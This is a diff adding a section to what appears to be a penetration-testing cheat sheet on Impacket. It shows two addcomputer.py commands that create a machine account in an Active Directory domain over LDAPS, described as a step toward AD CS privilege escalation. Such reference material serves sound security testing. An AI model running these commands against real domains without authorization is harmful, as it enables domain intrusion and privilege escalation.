@@ -7,6 +7,21 @@ website:
 render_with_liquid: false
 ---
 
+## addcomputer
+
+Add your computer to the domain and set the password.  
+It is usually used for AD CS (Active Directory Certificate Services) Privilege Escalation.
+
+```sh
+python3 ./impacket/examples/addcomputer.py '<domain-name>/username:password' -method LDAPS -computer-name 'PC-NAME' -computer-pass 'MyPcPassword'
+
+python3 ./impacket/examples/addcomputer.py '<domain-name>/username:password@<hostname>' -method LDAPS -computer-name 'PC-NAME' -computer-pass 'MyPcPassword'
+```
+
+<br />
+
+## impacket-netview
+
 ```sh
 impacket-netview -h
 ```
